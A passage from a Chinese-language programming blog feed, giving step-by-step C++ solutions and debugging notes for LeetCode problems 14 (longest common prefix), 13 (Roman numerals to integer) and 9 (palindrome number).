class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">    s += strs[<span class="number">0</span>][i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么if如果&#x3D;&#x3D;我们可以让他break掉，但是&#x3D;&#x3D; 反而break，好像给别人看起来就会很怪异，那么就干脆修改成!&#x3D;,这样应该就比较合理了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].<span class="built_in">length</span>(); i++)&#123;      <span class="comment">//用str[0]作为对象与后面的比较</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; strs.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs[<span class="number">0</span>][i] != strs[j][i])</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s += strs[<span class="number">0</span>][i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再测试一下：</p><img src="/2022/04/11/leetcodeno14/002.png" class=""><p>额，好像strs[1]比strs[0]要短哦，if好像还应该判断i有没有到达<code>strs[j].lenght()</code>，如果已经到达了后者，那么前面也没必要在判断了，或者说后者比前者大时，i如果没到达<code>strs[j].lenght()</code>，也不用着急停止。意味着我们的if应该是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strs[<span class="number">0</span>][i] != strs[j][i] &amp;&amp; i != strs[j].<span class="built_in">length</span>())</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>在测试了一下发现结果还是一样的</p><img src="/2022/04/11/leetcodeno14/002.png" class=""><p>拿去debug了一下。想起来break只是结束了内循环，s+还是生效了，所以如果符合if的条件时，我们应该让整个for都结束。能够达到这一类效果的应该就是直接return s;了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestCommonPrefix</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        string s = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].<span class="built_in">length</span>(); i++)&#123;      </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; strs.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(strs[<span class="number">0</span>][i] != strs[j][i] &amp;&amp; i != strs[j].<span class="built_in">length</span>())</span><br><span class="line">                    <span class="keyword">return</span> s;</span><br><span class="line">            &#125;</span><br><span class="line">            s += strs[<span class="number">0</span>][i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>测试了两个示例结果都正常的，提交看看。</p><img src="/2022/04/11/leetcodeno14/003.png" class=""><p>额小尴尬，解答错误了。</p><p>……又想了一圈，if里面应该是用或的，要么达到<code>strs[j].length()</code>,要么就是两个不相等，所噶所噶。。今天脑子有点不好使。<br>把解答错误的案例塞进去试了一下：</p><img src="/2022/04/11/leetcodeno14/004.png" class=""><p>。。。。。。坏事</p><p>哦哦哦。。应该是要么俩不相等，要么<code>i==strs[j].lenght()</code>;表示它走到头了该断了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strs[<span class="number">0</span>][i] != strs[j][i] || i == strs[j].<span class="built_in">length</span>())</span><br></pre></td></tr></table></figure><img src="/2022/04/11/leetcodeno14/005.png" class=""><p>再次提交：</p><img src="/2022/04/11/leetcodeno14/006.png" class=""><p>总算是过了。</p><p>最后修正：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestCommonPrefix</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        string s = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].<span class="built_in">length</span>(); i++)&#123;     </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; strs.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(strs[<span class="number">0</span>][i] != strs[j][i] || i == strs[j].<span class="built_in">length</span>())</span><br><span class="line">                    <span class="keyword">return</span> s;</span><br><span class="line">            &#125;</span><br><span class="line">            s += strs[<span class="number">0</span>][i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>…简单的题目就挺折腾的了，而且c++有段时间不看，就忘了一些函数的用法了。。得回头补补了</p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode第十三题</title>
      <link href="/2022/04/10/leetcodeno13/"/>
      <url>/2022/04/10/leetcodeno13/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>额想了个把小时都没有很好的主意去处理六个特殊情况。</p><span id="more"></span><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>switch</li><li>string</li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><img src="/2022/04/10/leetcodeno13/000.png" class=""><p>提示：</p><ul><li>1 &lt;&#x3D; s.length &lt;&#x3D; 15</li><li>s 仅含字符 (‘I’, ‘V’, ‘X’, ‘L’, ‘C’, ‘D’, ‘M’)</li><li>题目数据保证 s 是一个有效的罗马数字，且表示整数在范围 [1, 3999] 内</li><li>题目所给测试用例皆符合罗马数字书写规则，不会出现跨位等情况。</li><li>IL 和 IM 这样的例子并不符合题目要求，49 应该写作 XLIX，999 应该写作 CMXCIX 。</li></ul><blockquote><p>好处是罗马数字就七种字符，坏处有特殊的组合<br>且字符串s长度不超过15，转换后的整数范围不超过3999，这样倒是不用担心越界了。</p></blockquote><p>初始代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最后返回转换的罗马数字即可。</p><hr><h2 id="初解"><a href="#初解" class="headerlink" title="初解"></a>初解</h2><p>因为就7个字符，感觉可以用switch直接套，不然用map再套一层好像增加空间了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getCsetV</span><span class="params">(<span class="type">char</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span> : <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span> : <span class="keyword">return</span> <span class="number">5</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span> : <span class="keyword">return</span> <span class="number">10</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span> : <span class="keyword">return</span> <span class="number">50</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span> : <span class="keyword">return</span> <span class="number">100</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span> : <span class="keyword">return</span> <span class="number">500</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span> : <span class="keyword">return</span> <span class="number">1000</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>就先封装一个函数，但是问题就在于那几个特殊组合的情况。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] &lt; s[i+<span class="number">1</span>])&#123;</span><br><span class="line">                n += <span class="built_in">getCsetV</span>(s[i+<span class="number">1</span>]) - <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                n += <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getCsetV</span><span class="params">(<span class="type">char</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span> : <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span> : <span class="keyword">return</span> <span class="number">5</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span> : <span class="keyword">return</span> <span class="number">10</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span> : <span class="keyword">return</span> <span class="number">50</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span> : <span class="keyword">return</span> <span class="number">100</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span> : <span class="keyword">return</span> <span class="number">500</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span> : <span class="keyword">return</span> <span class="number">1000</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>遍历一遍是肯定要的，但是如果判断的是字符相不相等，再使其控制<code>n += </code>的情况，又有点不对头，因为i到了字符串末尾的时候，i+1就越界了不说。。单纯的s[i]返回的是字符，也不能作为比较的条件，那么就要创建两个变量或者是if的时候就要把s[i]放到getCsetV里面。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">getCsetV</span>(s[i]) &lt; <span class="built_in">getCsetV</span>(s[i+<span class="number">1</span>]))&#123;</span><br><span class="line">        n += <span class="built_in">getCsetV</span>(s[i+<span class="number">1</span>]) - <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        n += <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样修改后，测试的时候就会发现问题了，比如”IV”：</p><img src="/2022/04/10/leetcodeno13/001.png" class=""><p>貌似多了个5。。其实原因就是i&lt;的是s.length();<br>两个字符的时候，0 和 0+1已经判断过了，就没必要让i在自增了，<del>解决办法就是<code>i &lt; s.length()-1</code>;</del></p><p>-1方法不可取，之前脑子又陷进去了,为什么这么说呢，因为IV是特殊组合，它不需要像正常那样从左+到右，它是一组固定的值，如果我-1了，那个字符串正好是”LVIII“的话，最后的i就被舍弃了。</p><img src="/2022/04/10/leetcodeno13/002.png" class=""><p>debug了一圈，抓到是n+的问题。如果后者大于前者，n+&#x3D;后者-前者，但是最后还是要额外+一个后者。<br>所以应该是后者大于前者时，n -&#x3D; 前者，n此时为负数，然后就是正常情况下n +&#x3D; 后者。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">getCsetV</span>(s[i]) &lt; <span class="built_in">getCsetV</span>(s[i+<span class="number">1</span>]))&#123;</span><br><span class="line">    n -= <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    n += <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后又测了几个示例，应该是差不多了，提交一下：</p><img src="/2022/04/10/leetcodeno13/003.png" class=""><p>完整代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">getCsetV</span>(s[i]) &lt; <span class="built_in">getCsetV</span>(s[i+<span class="number">1</span>]))&#123;</span><br><span class="line">                n -= <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                n += <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getCsetV</span><span class="params">(<span class="type">char</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span> : <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span> : <span class="keyword">return</span> <span class="number">5</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span> : <span class="keyword">return</span> <span class="number">10</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span> : <span class="keyword">return</span> <span class="number">50</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span> : <span class="keyword">return</span> <span class="number">100</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span> : <span class="keyword">return</span> <span class="number">500</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span> : <span class="keyword">return</span> <span class="number">1000</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>好像没有特别能优化的地方，唯一想优化的就是对那几组特殊组合，能有什么办法不用循环判断就好了，直接循环累加。<br>map在我的想法里用起来也挺麻烦的感觉。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>然后就是翻阅评论了，精选第一条其实就是解释了一个思想。</p><img src="/2022/04/10/leetcodeno13/004.png" class=""><p>不过他用的hashmap，我是想如果能不额外增加变量那最好，虽然不知道hashmap的效率会不会更高。</p><p>然后就是一个秀儿的代码：</p><img src="/2022/04/10/leetcodeno13/005.png" class=""><p>雀食有点意思啊，直接把字符串s替换一下，把那六个组合替换成别的代替的字符，然后switch的时候分别对应六个值，这样for循环雀食省了if，只管累加就行。。。确实优秀</p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode第九题</title>
      <link href="/2022/04/08/leetcodeno9/"/>
      <url>/2022/04/08/leetcodeno9/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>先按难度往下走，因为数据结构还没理清。</p><span id="more"></span><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><del>c++ string：</del></p><ul><li><del>length —— 返回字符串长度</del></li><li><del>size —— 返回字符串长度</del></li></ul><p><del><strong>注意：strlen是以char*去计算字符串长度直到‘\0’结束，本题用不到。</strong></del></p><p>c++ vector:</p><ul><li>size —— 获取vector容器元素个数</li><li>operator[] —— 类似数组根据下标返回元素值</li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h2><img src="/2022/04/08/leetcodeno9/000.png" class=""><p>c++给到的代码框架：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>bool型函数，返回true或false即可</p></blockquote><p>根据现有条件可以排除x&lt;10的情况，因为个位数不可能存在回文现象，而两位数的10也不存在，负数更不用说，多了个-号；故此首先判断x&lt;10，如果成立直接返回false；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x &lt; <span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就是要拆开x去判断是否为回文数字,题目进阶思想是不使用将整数转换成字符串。先用最低级暴力去解题试试看。</p><hr><h3 id="初解"><a href="#初解" class="headerlink" title="初解"></a>初解</h3><p>字符串这里肯定不能用char了，因为不知道长度，所以得用str接着，让x每次%10，然后让str+&#x3D;x%10;</p><p><strong>注意：这里有个问题就是，int类型无法直接+&#x3D;给string类型，网上是有一些不同版本特性诞生的函数可以操作，但是这样对于算法的鲁棒性就很差了</strong><br>所以字符串应该是不可取的，至于题目进阶反而提示的是不使用整数转换成字符串我就不是很了解了，等我做完看看评论大哥怎么做的。</p><p>在上述不考虑string的情况下，我们如何让一个int类型还能做到拆分成像数组一样呢？其实就是老朋友vector了。</p><p>我们可以通过while转换:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"><span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    v.<span class="built_in">push_back</span>(x%<span class="number">10</span>);</span><br><span class="line">    x /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>即x倒置了一遍</p></blockquote><p>然后根据vector自带的size方法，先获取元素个数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> len = v.<span class="built_in">size</span>();</span><br></pre></td></tr></table></figure><p>然后首尾之间判断肯定是通过两个for循环了，但是需要统计一下，为什么这么说呢，因为我是把长度&#x2F;2来算，一个i从&#x3D;0 &lt; len&#x2F;2; 一个j &#x3D; len-1 &gt; len&#x2F;2; 这样首尾一判断也还行。故此代码： </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len/<span class="number">2</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = len<span class="number">-1</span>; j &gt; len/<span class="number">2</span>; j--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(v[i] == v[j])</span><br><span class="line">            num++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后最后在判断一些num是否&#x3D;len&#x2F;2，这样就证明了有几组数字是相同的。</p><p>提一嘴的就是，leetcode是要求函数必须返回一个值，所以我们直接在if完之后的return还不行。要定义一个bool flag；</p><p>在东拼西凑之后，代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( x &lt; <span class="number">10</span>)&#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">            <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                v.<span class="built_in">push_back</span>(x%<span class="number">10</span>);</span><br><span class="line">                x /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> len= v.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len/<span class="number">2</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = len<span class="number">-1</span>; j &gt; len/<span class="number">2</span>; j--)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(v[i] == v[j])</span><br><span class="line">                        num++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num == len/<span class="number">2</span>)</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>测试了几个案例之后我们提交一下看看：</p><img src="/2022/04/08/leetcodeno9/001.png" class=""><p>我直呼好家伙！！！！！<br>0居然算回文啊，那个位数其实都算了吧？<br>我直呼好家伙！！！！！<br>这么重要的东西不在示例里面。。靠，不过没事，</p><p>我们修改一下<code>if(x &lt; 0)</code>就可以了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 